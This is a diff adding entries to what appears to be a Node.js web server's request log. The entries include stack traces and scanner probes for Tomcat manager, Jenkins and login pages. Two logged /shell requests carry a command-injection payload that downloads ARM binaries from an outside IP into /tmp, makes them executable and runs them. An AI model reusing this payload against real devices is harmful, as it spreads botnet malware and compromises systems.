@@ -1133,3 +1133,54 @@ GET / -  {}
       at processTicksAndRejections (internal/process/task_queues.js:80:21)
 
 GET / -  {}
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:568:22)
+      at Socket.emit (events.js:327:22)
+      at endReadableNT (internal/streams/readable.js:1327:12)
+      at processTicksAndRejections (internal/process/task_queues.js:80:21)
+
+HEAD http://112.124.42.80:63435/ -  {}
+GET /manager/html -  {}
+GET /login -  {}
+GET /jenkins/login -  {}
+HEAD http://110.242.68.4/ -  {}
+GET / -  {}
+GET http://fuwu.sogou.com/404/index.html -  {}
+GET http://fuwu.sogou.com/404/index.html -  {}
+GET / -  {}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET / -  {}
+GET / -  {}
+
+  Error: write EPIPE
+      at afterWriteDispatched (internal/stream_base_commons.js:156:25)
+      at writeGeneric (internal/stream_base_commons.js:147:3)
+      at Socket._writeGeneric (net.js:785:11)
+      at Socket._write (net.js:797:8)
+      at writeOrBuffer (internal/streams/writable.js:358:12)
+      at Socket.Writable.write (internal/streams/writable.js:303:10)
+      at Socket.socketOnError (_http_server.js:652:12)
+      at socketOnEnd (_http_server.js:572:19)
+      at Socket.emit (events.js:327:22)
+      at endReadableNT (internal/streams/readable.js:1327:12)
+
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:568:22)
+      at Socket.emit (events.js:327:22)
+      at endReadableNT (internal/streams/readable.js:1327:12)
+      at processTicksAndRejections (internal/process/task_queues.js:80:21)
+
+GET / -  {}
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:568:22)
+      at Socket.emit (events.js:327:22)
+      at endReadableNT (internal/streams/readable.js:1327:12)
+      at processTicksAndRejections (internal/process/task_queues.js:80:21)
+
+GET / -  {}
+GET / -  {}
+GET / -  {}
